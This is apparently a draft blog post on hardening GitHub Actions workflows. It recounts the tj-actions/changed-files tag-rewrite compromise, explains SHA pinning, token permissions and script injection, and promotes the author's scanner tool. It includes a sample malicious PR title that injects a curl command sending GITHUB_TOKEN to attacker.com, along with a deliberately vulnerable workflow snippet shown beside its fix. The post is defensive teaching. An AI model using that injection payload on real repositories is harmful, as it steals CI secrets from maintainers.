---
title: The tj-actions attack hit 23,000 repos. Here's what your workflows are still doing wrong.
published: false
tags: security, github, devops, cicd
---

In March 2025, a single compromised GitHub Action hit 23,000+ repositories. The attacker gained write access to `tj-actions/changed-files`, rewrote the Git tags to point to malicious commits, and every repo running that action on a tag reference pulled in poisoned code on its next CI run. No alerts. CI ran normally. It was just also dumping secrets to the workflow logs.

The attack vector was not exotic. It was a one-liner in thousands of workflows:

```yaml
- uses: tj-actions/changed-files@v35
```

That `@v35` is a tag. Tags are mutable. Anyone with write access to the upstream repo can move a tag to any commit. You have no idea when it changes.

## Why pinning to tags is not pinning

"Pinning" gets misused constantly here. If you write `@v3` or `@v35`, you are not pinned to anything. You are subscribed to whatever the maintainer (or an attacker who compromised the maintainer) decides that tag should point to today.

Real pinning is a commit SHA:

```yaml
# Vulnerable — tag reference, can be rewritten
- uses: tj-actions/changed-files@v35

# Safe — commit SHA, immutable
- uses: tj-actions/changed-files@d08d32c7641b7b7c31f3fbd47e4c2c6b43468693  # v35
```

A 40-character SHA is immutable. If the upstream repo is compromised and the attacker moves that tag, the SHA changes. Your workflow keeps running the exact code you reviewed.

The `# v35` comment is not decoration. It's how you remember what you pinned to when it's time to update.

Most repos don't do this. I scanned a sample of public repos after building this tool and unpinned actions outnumbered pinned ones by roughly 10 to 1.

## Three ways your workflows are exposed

The tj-actions incident was the highest-profile example of the first one, not the only one.

**Unpinned actions**

Any `@tag` or `@branch` reference is a live subscription to code you don't control. The tj-actions case wasn't a zero-day. It was people trusting that `@v35` would always mean what it meant yesterday.

**Overly broad permissions**

GitHub Actions workflows run with a `GITHUB_TOKEN` that has configurable permissions. Most workflows never configure them:

```yaml
# No permissions block.
# GitHub's default grants read to most scopes and may grant write.
# Depending on org settings: write to contents, pull-requests, packages, actions.
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
```

If a compromised step runs in this workflow, it potentially has write access to your entire repo. The fix is one block:

```yaml
name: CI
on: [push]

permissions:
  contents: read  # Just enough for checkout

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45aca646fdde3  # v4
      - run: npm test
```

Declare what you need. Nothing else.

**Script injection via untrusted GitHub context**

This one shows up constantly in workflows that echo PR information or post comments:

```yaml
# Vulnerable — PR title goes directly into a shell command
- name: Post comment
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
```

`github.event.pull_request.title` is attacker-controlled. Anyone who can open a PR can set the title to `"; curl https://attacker.com/exfil?token=$GITHUB_TOKEN; echo "`. That string gets interpolated into the shell command before the shell ever sees it.

Route untrusted values through environment variables instead:

```yaml
# Safe — goes to env var, referenced as $ENV_VAR in shell
- name: Post comment
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "PR title: $PR_TITLE"
```

Environment variable expansion in bash does not allow command injection. The `${{ }}` interpolation happens before the shell runs; the `$ENV_VAR` expansion happens inside the shell with proper quoting semantics.

PR title, body, branch name, issue title, comment body, commit message, author fields: all attacker-controlled. All can be set by external contributors.

## I built a scanner for this

After the tj-actions incident I went looking for a tool that caught all three of these in a single pass and could fail CI if it found them. Nothing did all three together, so I built [gh-workflow-hardener](https://github.com/indoor47/gh-workflow-hardener).

Python CLI. Two dependencies: `pyyaml` and `click`. Scans all workflow files in `.github/workflows/` for unpinned actions, dangerous permissions, and script injection.

```bash
pip install gh-workflow-hardener
gh-workflow-hardener scan .
```

Output on a repo with issues:

```
gh-workflow-hardener v1.0.0
Issues found: 3

[CRITICAL] Line 12: unpinned-action
  Action `actions/checkout@v3` is not pinned to a commit SHA.
  Tags and branches can be moved to point to malicious code.
  See: tj-actions/changed-files supply chain attack (March 2025).
  Fix: Pin to SHA: `uses: actions/checkout@<commit-sha>  # v3`

[HIGH] Line 1: missing-permissions
  No top-level `permissions` block defined.
  Without explicit permissions, the GITHUB_TOKEN gets the repository's
  default permissions (often read-write).
  Fix: Add at the top level:
  permissions:
    contents: read

[CRITICAL] Line 31: script-injection
  Untrusted input `${{ github.event.pull_request.title }}` used in a `run:` block.
  An attacker can inject arbitrary shell commands through this value.
  Fix: Move to env block:
    env:
      UNTRUSTED_INPUT: ${{ github.event.pull_request.title }}
    run: echo "$UNTRUSTED_INPUT"
```

The tool also runs as a GitHub Action, triggering on workflow file changes and blocking PRs that introduce new issues:

```yaml
name: Workflow Security Check
on:
  pull_request:
    paths:
      - '.github/workflows/**'
  push:
    branches:
      - main
    paths:
      - '.github/workflows/**'

permissions:
  contents: read

jobs:
  hardener:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45aca646fdde3  # v4
      - uses: indoor47/gh-workflow-hardener@v1.0.0
        with:
          fail_on: critical
```

`--fail-on critical` blocks on unpinned actions and script injection. `--fail-on high` also catches missing or overly broad permissions. `--fail-on none` runs in report-only mode, useful if you want to audit an existing repo without immediately breaking everything.

## The scope of the problem

The tj-actions attack made this hard to ignore for about two weeks. Then people moved on. But the vulnerability it exploited had been documented for years. GitHub's own security hardening guide covers SHA pinning. The StepSecurity tooling existed before the attack. The problem wasn't that nobody knew. It's that checking for these issues required either manual review or stitching together separate tools, and most teams had other things to do.

23,000 repositories were exposed in that incident. The actual number of vulnerable repos was far higher — those were just the ones running that specific action. Unpinned actions are the default. Nothing in the GitHub UI warns you that `@v3` is mutable. There's no "require SHA pinning" checkbox in repository settings.

Until GitHub adds one, this has to get enforced at the workflow level.

---

Repo: [github.com/indoor47/gh-workflow-hardener](https://github.com/indoor47/gh-workflow-hardener)

If you find a false positive or a detection case I missed, open an issue.
